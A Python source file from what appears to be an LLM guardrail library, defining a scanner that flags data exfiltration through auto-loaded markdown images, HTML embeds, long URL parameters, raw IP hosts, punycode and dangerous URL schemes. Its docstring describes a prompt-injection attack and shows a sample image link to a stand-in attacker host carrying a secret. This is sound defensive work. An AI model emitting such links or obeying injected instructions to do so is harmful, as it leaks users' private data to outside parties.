"""Link / URL scanner — catches data exfiltration through rendered links and images.

A classic attack on chat UIs and agents: an injected instruction makes the model
emit `![x](https://attacker.tld/log?d=<secret>)`; the client auto-fetches the image
and the data leaves. This scanner flags such links, dangerous URL schemes, raw IP
hosts, and (optionally) any domain outside an allow-list.
"""

from __future__ import annotations

import re
from collections.abc import Iterable
from urllib.parse import parse_qsl, urlsplit

from guardlayer.models import Category, Detection, ScanContext
from guardlayer.scanners.base import BaseScanner

EXFIL = Category.DATA_EXFILTRATION.value
LINK = Category.UNSAFE_LINK.value

_MD_IMAGE_RE = re.compile(r"!\[[^\]]{0,200}\]\(\s*<?([^)\s>]+)")
_HTML_SRC_RE = re.compile(r"<(?:img|iframe|script|link|source|video|audio)\b[^>]{0,300}?\b(?:src|href)\s*=\s*[\"']?([^\"'\s>]+)", re.IGNORECASE)
_URL_RE = re.compile(r"\b(?:https?|ftp|wss?)://[^\s<>\"'`)\]]+", re.IGNORECASE)
_SCHEME_RE = re.compile(r"\b(javascript|vbscript|data\s*:\s*text/html|file):", re.IGNORECASE)
_IP_HOST_RE = re.compile(r"^\d{1,3}(\.\d{1,3}){3}$|^\[[0-9a-f:]+\]$", re.IGNORECASE)


class LinkScanner(BaseScanner):
    name = "links"
    default_directions = frozenset({"output", "context"})

    def __init__(
        self,
        *,
        allowed_domains: Iterable[str] | None = None,
        max_param_length: int = 64,
        directions: Iterable[str] | None = None,
    ) -> None:
        super().__init__(directions)
        self.allowed_domains = {d.lower().lstrip(".") for d in allowed_domains} if allowed_domains else set()
        self.max_param_length = max_param_length

    def _allowed(self, host: str) -> bool:
        host = host.lower()
        return any(host == d or host.endswith("." + d) for d in self.allowed_domains)

    def scan(self, text: str, context: ScanContext) -> list[Detection]:
        found: list[Detection] = []
        seen: set[tuple[str, int]] = set()

        def add(rule: str, category: str, severity: float, message: str, span: tuple[int, int], url: str) -> None:
            if (rule, span[0]) in seen:
                return
            seen.add((rule, span[0]))
            found.append(self.detection(rule, category, severity, message, span, url=url[:300]))

        embedded = [(m.group(1), m.span(1)) for m in _MD_IMAGE_RE.finditer(text)]
        embedded += [(m.group(1), m.span(1)) for m in _HTML_SRC_RE.finditer(text)]
        for url, span in embedded:
            parts = _split(url)
            if parts is None:
                continue
            host, query = parts
            if host and not self._allowed(host) and query:
                add("auto_fetch_exfiltration", EXFIL, 0.85, "Auto-loaded image/embed sends query data to an external host.", span, url)

        for match in _URL_RE.finditer(text):
            url, span = match.group(), match.span()
            parts = _split(url)
            if parts is None:
                continue
            host, query = parts
            if self._allowed(host):
                continue
            long_params = [v for _, v in parse_qsl(query, keep_blank_values=True) if len(v) >= self.max_param_length]
            if long_params:
                add("url_data_exfiltration", EXFIL, 0.6, "URL carries an unusually long parameter (possible data exfiltration).", span, url)
            if _IP_HOST_RE.match(host):
                add("ip_literal_host", LINK, 0.4, "URL points to a raw IP address.", span, url)
            if host.startswith("xn--") or ".xn--" in host:
                add("punycode_host", LINK, 0.35, "Punycode (possibly look-alike) domain.", span, url)
            if self.allowed_domains:
                add("untrusted_domain", LINK, 0.5, f"Link to a domain outside the allow-list: {host}.", span, url)

        for match in _SCHEME_RE.finditer(text):
            add("dangerous_scheme", LINK, 0.7, f"Dangerous URL scheme '{match.group(1)}:'.", match.span(), match.group())
        return found


def _split(url: str) -> tuple[str, str] | None:
    try:
        parts = urlsplit(url)
    except ValueError:
        return None
    if parts.scheme.lower() not in {"http", "https", "ftp", "ws", "wss"}:
        return None
    return (parts.hostname or "", parts.query)
